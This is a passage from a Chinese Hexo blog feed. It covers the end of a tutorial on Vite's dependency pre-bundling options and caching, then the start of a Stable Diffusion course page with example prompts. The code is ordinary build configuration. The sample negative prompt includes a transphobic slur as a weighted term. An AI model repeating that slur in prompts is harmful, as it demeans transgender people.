/>Vite 将预构建相关的配置项都集中在 <strong>optimizeDeps</strong> 属性上，我们来一一拆解这些子配置项背后的含义和应用场景。</p><p><a name="sdgkY"></a></p><h4 id="入口文件：entries"><a href="#入口文件：entries" class="headerlink" title="入口文件：entries"></a>入口文件：entries</h4><p>第一个是参数是 <code>optimizeDeps.entries</code>，通过这个参数你可以自定义预构建的入口文件。</p><p>实际上，在项目第一次启动时，Vite 会默认抓取项目中所有的 HTML 文件（如当前脚手架项目中的 index.html），将 HTML 文件作为应用入口，然后根据入口文件扫描出项目中用到的第三方依赖，最后对这些依赖逐个进行编译。<br />那么，当默认扫描 HTML 文件的行为无法满足需求的时候，比如项目入口需要为 vue 格式文件时，你可以通过 entries 参数来配置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">optimizeDeps</span>: &#123;</span><br><span class="line">    <span class="comment">// 为一个字符串数组</span></span><br><span class="line">    <span class="attr">entries</span>: [<span class="string">&quot;./src/main.vue&quot;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>entries 配置也支持 <a href="https://link.juejin.cn/?target=https://github.com/mrmlnc/fast-glob">glob 语法</a>，非常灵活：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将所有的 .vue 文件作为扫描入口</span></span><br><span class="line"><span class="attr">entries</span>: [<span class="string">&quot;**/*.vue&quot;</span>];</span><br></pre></td></tr></table></figure><p>不光是.vue 文件，Vite 同时还支持各种格式的入口，包括: html、svelte、astro、js、jsx、ts 和 tsx。<br />可以看到，只要可能存在 import 语句的地方，Vite 都可以解析，并通过内置的扫描机制搜集到项目中用到的依赖，通用性很强。</p><p><a name="RwMTi"></a></p><h4 id="添加一些依赖：include"><a href="#添加一些依赖：include" class="headerlink" title="添加一些依赖：include"></a>添加一些依赖：include</h4><p>include 也是一个很常用的配置，它决定了可以强制预构建的依赖项<br />使用方式很简单：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"><span class="attr">optimizeDeps</span>: &#123;</span><br><span class="line">  <span class="comment">// 配置为一个字符串数组，将 `lodash-es` 和 `vue`两个包强制进行预构建</span></span><br><span class="line">  <span class="attr">include</span>: [<span class="string">&quot;lodash-es&quot;</span>, <span class="string">&quot;vue&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它在使用上并不难，真正难的地方在于，如何找到合适它的使用场景。<br />前文中我们提到，Vite 会根据应用入口（entries）自动搜集依赖，然后进行预构建，这是不是说明 Vite 可以百分百准确地搜集到所有的依赖呢？事实上并不是，某些情况下 Vite 默认的扫描行为并不完全可靠，这就需要联合配置 include 来达到完美的预构建效果了。</p><p>接下来，我们好好梳理一下到底有哪些需要配置 include 的场景：<br><a name="PATVa"></a></p><h5 id="场景-1-动态-import"><a href="#场景-1-动态-import" class="headerlink" title="场景 1 - 动态 import"></a>场景 1 - 动态 import</h5><p>在某些动态 import 的场景下，由于 Vite 天然按需加载的特性，经常会导致某些依赖只能在运行时被识别出来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/locales/zh_CN.js</span></span><br><span class="line"><span class="keyword">import</span> objectAssign <span class="keyword">from</span> <span class="string">&quot;object-assign&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objectAssign);</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.tsx</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">importModule</span> = (<span class="params">m</span>) =&gt; <span class="keyword">import</span>(<span class="string">`./locales/<span class="subst">$&#123;m&#125;</span>.ts`</span>);</span><br><span class="line">importModule(<span class="string">&quot;zh_CN&quot;</span>);</span><br></pre></td></tr></table></figure><p>在这个例子中，动态 import 的路径只有运行时才能确定，导致无法在预构建阶段被扫描出来。<br />因此，我们在访问项目时控制台会出现下面的日志信息：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695025928681-7f09edaa-95be-47e4-9ecc-27d161fd7ffd.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695025928681-7f09edaa-95be-47e4-9ecc-27d161fd7ffd.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />这段 log 的意思是：Vite 运行时发现了新的依赖，随之重新进行依赖预构建，并刷新页面。<br />这个过程也叫<strong>二次预构建</strong>。在一些比较复杂的项目中，这个过程会执行很多次，如下面的日志信息所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[vite] new dependencies found: @material-ui/icons/Dehaze, @material-ui/core/Box, @material-ui/core/Checkbox, updating...</span><br><span class="line">[vite] ✨ dependencies updated, reloading page...</span><br><span class="line">[vite] new dependencies found: @material-ui/core/Dialog, @material-ui/core/DialogActions, updating...</span><br><span class="line">[vite] ✨ dependencies updated, reloading page...</span><br><span class="line">[vite] new dependencies found: @material-ui/core/Accordion, @material-ui/core/AccordionSummary, updating...</span><br><span class="line">[vite] ✨ dependencies updated, reloading page...</span><br></pre></td></tr></table></figure><p>然而，二次预构建的成本也比较大。<br />我们不仅需要把预构建的流程重新运行一遍，还得重新刷新页面，并且需要重新请求所有的模块。尤其是在大型项目中，这个过程会严重拖慢应用的加载速度！<br />因此，我们要尽力避免运行时的<strong>二次预构建</strong>。具体怎么做呢？就是通过 include 参数提前声明需要按需加载的依赖：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">optimizeDeps</span>: &#123;</span><br><span class="line">    <span class="attr">include</span>: [</span><br><span class="line">      <span class="comment">// 按需加载的依赖都可以声明到这个数组里</span></span><br><span class="line">      <span class="string">&quot;object-assign&quot;</span>,</span><br><span class="line">    ];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="n3p1i"></a></p><h5 id="场景-2-某些包被手动-exclude"><a href="#场景-2-某些包被手动-exclude" class="headerlink" title="场景 2 - 某些包被手动 exclude"></a>场景 2 - 某些包被手动 exclude</h5><p>exclude 是 optimizeDeps 中的另一个配置项，与 include 相对，用于将某些依赖从预构建的过程中排除。<br />不过这个配置并不常用，也不推荐大家使用。<br />如果真遇到了要在预构建中排除某个包的情况，需要注意它所依赖的包是否具有 ESM 格式，如下面这个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">optimizeDeps</span>: &#123;</span><br><span class="line">    <span class="attr">exclude</span>: [<span class="string">&quot;@loadable/component&quot;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到浏览器控制台会出现如下的报错：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695026098928-8764c932-1041-4cae-9bb0-2b797970a2eb.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695026098928-8764c932-1041-4cae-9bb0-2b797970a2eb.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />这是为什么呢？因为我们刚刚手动 exclude 的包 @loadable/component 本身具有 ESM 格式的产物，但它的某个依赖 hoist-non-react-statics 的产物并没有提供 ESM 格式，导致运行时加载失败。</p><p>这个时候 include 配置就派上用场了，我们可以强制对 hoist-non-react-statics 这个间接依赖进行预构建：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">optimizeDeps</span>: &#123;</span><br><span class="line">    <span class="attr">include</span>: [</span><br><span class="line">      <span class="comment">// 间接依赖的声明语法，通过`&gt;`分开, 如`a &gt; b`表示 a 中依赖的 b</span></span><br><span class="line">      <span class="string">&quot;@loadable/component &gt; hoist-non-react-statics&quot;</span>,</span><br><span class="line">    ];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 include 参数中，我们将所有不具备 ESM 格式产物包都声明一遍，这样再次启动项目就没有问题了。</p><p><a name="SNFD9"></a></p><h4 id="自定义预构建时的-Esbuild-行为"><a href="#自定义预构建时的-Esbuild-行为" class="headerlink" title="自定义预构建时的 Esbuild 行为"></a>自定义预构建时的 Esbuild 行为</h4><p>Vite 提供了 esbuildOptions 参数来让我们自定义 Esbuild 本身的配置，常用的场景是加入一些 Esbuild 插件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">optimizeDeps</span>: &#123;</span><br><span class="line">    <span class="attr">esbuildOptions</span>: &#123;</span><br><span class="line">       <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="comment">// 加入 Esbuild 插件</span></span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个配置主要是处理一些特殊情况，例如某个第三方包本身的代码出现问题了。</p><p>接下来，我们就来讨论一下第三方包出现问题怎么办。</p><p>由于我们无法保证第三方包的代码质量，在某些情况下我们会遇到莫名的第三方库报错。举一个常见的案例：react-virtualized 库。这个库被许多组件库用到，但它的 ESM 格式产物有明显的问题，在 Vite 进行预构建的时候会直接抛出这个错误：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695026369627-e32f132a-2e5c-4d10-becf-ca9550817b9c.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695026369627-e32f132a-2e5c-4d10-becf-ca9550817b9c.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />原因是这个库的 ES 产物莫名其妙多出了一行无用的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WindowScroller.js 并没有导出这个模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; bpfrpt_proptype_WindowScroller &#125; <span class="keyword">from</span> <span class="string">&quot;../WindowScroller.js&quot;</span>;</span><br></pre></td></tr></table></figure><p>其实我们并不需要这行代码，但它却导致 Esbuild 预构建的时候直接报错退出了。<br />那这一类的问题如何解决呢？</p><p><a name="Nd5IY"></a></p><h5 id="修改第三方库代码"><a href="#修改第三方库代码" class="headerlink" title="修改第三方库代码"></a>修改第三方库代码</h5><p>首先，我们能想到的思路是<strong>直接修改第三方库的代码</strong>，不过这会带来团队协作的问题，你的改动需要同步到团队所有成员，比较麻烦。<br />好在，我们可以使用 patch-package 这个库来解决这类问题。一方面，它能记录第三方库代码的改动，另一方面也能将改动同步到团队每个成员。<br />patch-package 官方只支持 npm 和 yarn，而不支持 pnpm，不过社区中已经提供了支持 pnpm 的版本，这里我们来安装一下相应的包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm i @milahu/patch-package -D</span><br></pre></td></tr></table></figure><blockquote><p>注意：要改动的包在 package.json 中必须声明确定的版本，不能有 ~ 或 ^ 前缀。</p></blockquote><p>接着，我们进入第三方库的代码中进行修改，先删掉无用的 import 语句，再在命令行输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx patch-package react-virtualized</span><br></pre></td></tr></table></figure><p>现在根目录会多出 patches 目录记录第三方包内容的更改，随后我们在 package.json 的 scripts 中增加如下内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 省略其它 script</span></span><br><span class="line">    <span class="attr">&quot;postinstall&quot;</span><span class="punctuation">:</span> <span class="string">&quot;patch-package&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这样一来，每次安装依赖的时候都会通过 postinstall 脚本自动应用 patches 的修改，解决了团队协作的问题。</p><p><a name="D3IE7"></a></p><h5 id="加入-Esbuild-插件"><a href="#加入-Esbuild-插件" class="headerlink" title="加入 Esbuild 插件"></a>加入 Esbuild 插件</h5><p>第二种方式是通过 Esbuild 插件修改指定模块的内容<br />这里给大家展示一下新增的配置内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"><span class="keyword">const</span> esbuildPatchPlugin = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;react-virtualized-patch&quot;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params">build</span>) &#123;</span><br><span class="line">    build.<span class="title function_">onLoad</span>(</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">filter</span>:</span><br><span class="line">          <span class="regexp">/react-virtualized\/dist\/es\/WindowScroller\/utils\/onScroll.js$/</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="keyword">async</span> (args) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> text = <span class="keyword">await</span> fs.<span class="property">promises</span>.<span class="title function_">readFile</span>(args.<span class="property">path</span>, <span class="string">&quot;utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          <span class="attr">contents</span>: text.<span class="title function_">replace</span>(</span><br><span class="line">            <span class="string">&#x27;import &#123; bpfrpt_proptype_WindowScroller &#125; from &quot;../WindowScroller.js&quot;;&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span></span><br><span class="line">          ),</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插件加入 Vite 预构建配置</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">optimizeDeps</span>: &#123;</span><br><span class="line">    <span class="attr">esbuildOptions</span>: &#123;</span><br><span class="line">      <span class="attr">plugins</span>: [esbuildPatchPlugin];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>关于 Esbuild 插件的实现细节，在之后的章节介绍</p></blockquote><p>所以，每次依赖安装时都会执行该插件修改第三方库的代码。</p><blockquote><p>而在生产环境，则需要写同样的 Rollup 插件解决这个问题。</p></blockquote><p><a name="EN7mu"></a></p><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p><a name="EKlyZ"></a></p><h4 id="文件系统缓存"><a href="#文件系统缓存" class="headerlink" title="文件系统缓存"></a>文件系统缓存</h4><p>Vite 将预构建的依赖项缓存到 <code>node_modules/.vite</code> 中。只有在下面其中一项发生更改时，才需要重新运行预构建（会在源码分析中看到）：</p><ul><li>包管理器的锁文件内容，例如 package-lock.json，yarn.lock，pnpm-lock.yaml，或者 bun.lockb；</li><li>补丁文件夹的修改时间；</li><li>vite.config.js 中的相关字段；</li><li>NODE_ENV 的值。<blockquote><p>如果出于某些原因你想要强制 Vite 重新构建依赖项，你可以在启动开发服务器时指定 --force 选项，或手动删除 node_modules/.vite 缓存目录。</p></blockquote></li></ul><p><a name="q5naN"></a></p><h4 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h4><p>已经预构建的依赖，请求中会使用 HTTP 头 max-age=31536000, immutable 进行强缓存，以提高开发期间页面重新加载的性能。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695025284334-b13b7e36-300a-402b-83fa-95d13956dc39.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695025284334-b13b7e36-300a-402b-83fa-95d13956dc39.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>一旦被缓存，这些请求将永远不会再次访问开发服务器。（依赖一般情况下不会变化）</strong></p><blockquote><p>如果重新安装了不同版本的依赖项（这反映在包管理器的 lockfile 中），则会通过附加版本查询自动失效。<br>如果你想通过本地编辑来调试依赖项，您可以：</p><ol><li>通过浏览器开发工具的 Network 选项卡暂时禁用缓存；</li><li>重启 Vite 开发服务器指定 --force 选项，来重新构建依赖项;</li><li>重新载入页面。</li></ol></blockquote><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工程化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SD 绘图入门</title>
      <link href="/2024/03/14/stable-diffusion/sd-hui-tu-ru-men/"/>
      <url>/2024/03/14/stable-diffusion/sd-hui-tu-ru-men/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="oWkcu"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a name="qhLb3"></a></p><h2 id="第-1-课：初识应用与基本出图流程"><a href="#第-1-课：初识应用与基本出图流程" class="headerlink" title="第 1 课：初识应用与基本出图流程 "></a><a href="https://nenly.notion.site/1-732d811aff564e8387924f4ff5a106bd">第 1 课：初识应用与基本出图流程 </a></h2><p><a name="bA75S"></a></p><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398706192-296cfeb8-6281-4b3e-a92f-fd70b3a5c589.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398706192-296cfeb8-6281-4b3e-a92f-fd70b3a5c589.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD01：AI绘画原理与基础界面.png"><br><a name="vcjAw"></a></p><h3 id="提示词"><a href="#提示词" class="headerlink" title="提示词"></a>提示词</h3><p>一个女孩，在森林里漫步，阳光洒落在她的身上<br />A girl, walking in the forest, the sun fell on her body, looking at viewer, close-up, upper body,</p><p>正面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(masterpiece:1,2), best quality, highres, original, extremely detailed wallpaper, perfect lighting,(extremely detailed CG:1.2),</span><br></pre></td></tr></table></figure><p>负面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSFW, (worst quality:2), (low quality:2), (normal quality:2), lowres, normal quality, ((monochrome)), ((grayscale)), skin spots, acnes, skin blemishes, age spot, (ugly:1.331), (duplicate:1.331), (morbid:1.21), (mutilated:1.21), (tranny:1.331), mutated hands, (poorly drawn hands:1.5), blurry, (bad anatomy:1.21), (bad proportions:1.331), extra limbs, (disfigured:1.331), (missing arms:1.331), (extra legs:1.331), (fused fingers:1.61051), (too many fingers:1.61051), (unclear eyes:1.331), lowers, bad hands, missing fingers, extra digit,bad hands, badhandv4, missing fingers, (((extra arms and legs))),</span><br></pre></td></tr></table></figure><p><a name="E6W2G"></a></p><h2 id="第-2-课：文生图入门与参数设置"><a href="#第-2-课：文生图入门与参数设置" class="headerlink" title=" 第 2 课：文生图入门与参数设置 "></a><a href="https://nenly.notion.site/2-c8e765308c95425f84cef6d3e0bf1cc4"> 第 2 课：文生图入门与参数设置 </a></h2><p><a name="AH24r"></a></p><h3 id="思维导图-1"><a href="#思维导图-1" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710397978473-d2c1f01c-57c3-4e4f-b2de-fa8591f71c6d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710397978473-d2c1f01c-57c3-4e4f-b2de-fa8591f71c6d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD02：文生图入门与提示词基础.png"></p><p><a name="cbCMR"></a></p><h2 id="第-3-课：图生图入门"><a href="#第-3-课：图生图入门" class="headerlink" title=" 第 3 课：图生图入门 "></a><a href="https://nenly.notion.site/3-13a380b6b3384fcba2d23f40a97ab0e6"> 第 3 课：图生图入门 </a></h2><p><a name="bHWgx"></a></p><h3 id="思维导图-2"><a href="#思维导图-2" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398016838-1cd132e2-5801-4619-9a32-f847fcb9a84c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398016838-1cd132e2-5801-4619-9a32-f847fcb9a84c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD03：图生图入门.png"></p><p><a name="ld62u"></a></p><h2 id="第-4-课：模型下载与应用"><a href="#第-4-课：模型下载与应用" class="headerlink" title=" 第 4 课：模型下载与应用"></a><a href="https://nenly.notion.site/4-de22d2ce460f4f88800cdc5ffada976f#22eacaf7d8e74a518ffb527a5f100934"> 第 4 课：模型下载与应用</a></h2><p><a name="HoUeu"></a></p><h3 id="思维导图-3"><a href="#思维导图-3" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398120718-d0a0da1c-a592-468f-b93a-9abed8e44411.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398120718-d0a0da1c-a592-468f-b93a-9abed8e44411.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD04：模型下载与应用.png"></p><p><a name="mq9dw"></a></p><h2 id="第-5-课：高清修复与后期处理"><a href="#第-5-课：高清修复与后期处理" class="headerlink" title="第 5 课：高清修复与后期处理 "></a><a href="https://nenly.notion.site/5-b41e338382ab46c4ae5227bc53d0bc30">第 5 课：高清修复与后期处理 </a></h2><p><a name="GeRJs"></a></p><h3 id="思维导图-4"><a href="#思维导图-4" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398169097-60e42949-2f9c-4581-94cd-56ee77e3499a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398169097-60e42949-2f9c-4581-94cd-56ee77e3499a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD05：高清修复与后期放大.png"></p><p><a name="Zt5jU"></a></p><h2 id="第-6-课：进阶模型原理解析"><a href="#第-6-课：进阶模型原理解析" class="headerlink" title=" 第 6 课：进阶模型原理解析 "></a><a href="https://nenly.notion.site/6-9754675d0bcc4df8bbb1458b92077bd2"> 第 6 课：进阶模型原理解析 </a></h2><p><a name="WeLsb"></a></p><h3 id="思维导图-5"><a href="#思维导图-5" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398175312-bad018c0-0f67-4a36-b330-41b0e44b185a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398175312-bad018c0-0f67-4a36-b330-41b0e44b185a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD06：Embeddings、LoRA和Hypernetwork.png"></p><p><a name="VDxFh"></a></p><h2 id="第-7-课：局部重绘"><a href="#第-7-课：局部重绘" class="headerlink" title=" 第 7 课：局部重绘 "></a><a href="https://nenly.notion.site/7-56b41d8a73be403bacf19fb6f7b993d7"> 第 7 课：局部重绘 </a></h2><p><a name="eMKKG"></a></p><h3 id="思维导图-6"><a href="#思维导图-6" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398721101-6ab85688-0912-43c5-bf4d-e98e08a23f45.png" class="lazyload placeholder" 